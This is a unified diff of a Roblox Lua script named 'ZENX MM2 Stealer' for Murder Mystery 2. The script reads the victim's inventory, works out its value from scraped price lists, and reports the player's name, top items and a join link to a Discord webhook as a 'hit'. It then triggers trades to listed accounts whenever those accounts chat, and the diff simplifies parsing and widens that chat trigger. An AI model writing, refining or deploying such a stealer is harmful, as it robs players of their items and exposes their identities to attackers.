@@ -18,51 +18,41 @@ if game.PlaceId ~= 142823291 then
     return
 end
 
--- Improved Biscuit-Style Value Scraper (Fixed Parsing)
+-- Improved Value Scraper
+local itemValues = {}
 local valuePages = {
     "https://supremevaluelist.com/mm2/godlies.html",
     "https://supremevaluelist.com/mm2/ancients.html",
     "https://supremevaluelist.com/mm2/uniques.html",
     "https://supremevaluelist.com/mm2/vintages.html",
-    "https://supremevaluelist.com/mm2/chromas.html",
 }
 
-local itemValues = {}
-
 local function loadValues()
-    print("🔄 Loading fresh MM2 values...")
     for _, link in ipairs(valuePages) do
         pcall(function()
             local resp = request({Url = link, Method = "GET"})
             if resp and resp.Body then
-                -- Stronger parsing for value numbers
-                for nameBlock, valBlock in resp.Body:gmatch("(<h.-</div>.-Value.-)") do
+                for nameBlock in resp.Body:gmatch("<h.-</div>") do
                     local name = nameBlock:match(">([^<]+)<")
-                    local valText = valBlock:match("([%d,]+)")
+                    local valText = nameBlock:match("([%d,]+)")
                     if name and valText then
-                        local cleanName = name:match("^%s*(.-)%s*$"):lower()
-                        local val = tonumber(valText:gsub(",", ""))
-                        if cleanName and val and val > 50 then
-                            itemValues[cleanName] = val
-                        end
+                        local clean = name:match("^%s*(.-)%s*$"):lower()
+                        itemValues[clean] = tonumber(valText:gsub(",", ""))
                     end
                 end
             end
         end)
-        task.wait(0.6)
+        task.wait(0.5)
     end
-    print("✅ Loaded " .. #itemValues .. " item values")
 end
-
 loadValues()
 
--- Inventory + Value Calculation
+-- Inventory
 local itemsToTrade = {}
 local overallValue = 0
 local rarityCounts = {Godly=0, Ancient=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
 
 local itemDatabase = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-
 local success, inventoryData = pcall(function()
     return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(LocalPlayer.Name)
 end)
@@ -72,13 +62,10 @@ if success and inventoryData and inventoryData.Weapons then
         local info = itemDatabase[itemId]
         if info and not (itemId == "DefaultGun" or itemId == "DefaultKnife") then
             local name = tostring(info.ItemName)
-            local lower = name:lower()
-            local val = itemValues[lower] or 150
+            local val = itemValues[name:lower()] or 150
             overallValue += val * count
-
             local rarity = info.Rarity or "Common"
             if rarityCounts[rarity] then rarityCounts[rarity] = rarityCounts[rarity] + count end
-
             table.insert(itemsToTrade, {id = itemId, name = name, qty = count, val = val})
         end
     end
@@ -95,23 +82,20 @@ local function postToDiscord()
         table.insert(displayLines, string.format("x%d %s → %d", item.qty, item.name, item.val))
     end
 
-    local content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone **BIG HIT**" or "**Small Hit**") 
-                 .. " • Value: " .. string.format("%.0f", overallValue)
-
     local embed = {
-        content = content,
+        content = (overallValue >= minPingVal and minPingVal > 0 and "@everyone **BIG HIT**" or "**Small Hit**") .. " • Value: " .. string.format("%.0f", overallValue),
         username = "ZENX MM2 Stealer",
         embeds = {{
             title = "🍪 ZENX | Murder Mystery 2 Hit",
             color = 0xFF00FF,
             fields = {
-                {name = "Victim", value = LocalPlayer.Name, inline = true},
+                {name = "Victim", value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")", inline = true},
                 {name = "Total Value", value = string.format("%.0f", overallValue), inline = true},
-                {name = "Rarity Count", value = string.format("Godly:%d Ancient:%d Unique:%d Vintage:%d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
+                {name = "Rarity Breakdown", value = string.format("Godly:%d | Ancient:%d | Unique:%d | Vintage:%d", rarityCounts.Godly, rarityCounts.Ancient, rarityCounts.Unique, rarityCounts.Vintage), inline = false},
                 {name = "Top Items", value = "```" .. table.concat(displayLines, "\n") .. "```", inline = false},
                 {name = "Join Link", value = joinLink, inline = false},
             },
-            footer = {text = "ZENX HUB • Fixed Value Scraper"},
+            footer = {text = "ZENX HUB • Fixed Scraper"},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -163,11 +147,7 @@ end
 
 local function onPlayerAdded(plr)
     if table.find(usernames, plr.Name) then
-        plr.Chatted:Connect(function(msg)
-            if msg:lower():find("trade") or msg:lower():find("accept") then
-                doTrade(plr)
-            end
-        end)
+        plr.Chatted:Connect(function() doTrade(plr) end)
     end
 end
 
@@ -175,4 +155,4 @@ for _, plr in ipairs(Players:GetPlayers()) do onPlayerAdded(plr) end
 Players.PlayerAdded:Connect(onPlayerAdded)
 
 postToDiscord()
-print("✅ ZENX MM2 Stealer - Fixed Value Numbers Loaded")
+print("✅ ZENX MM2 Stealer - Reverted Version Loaded")
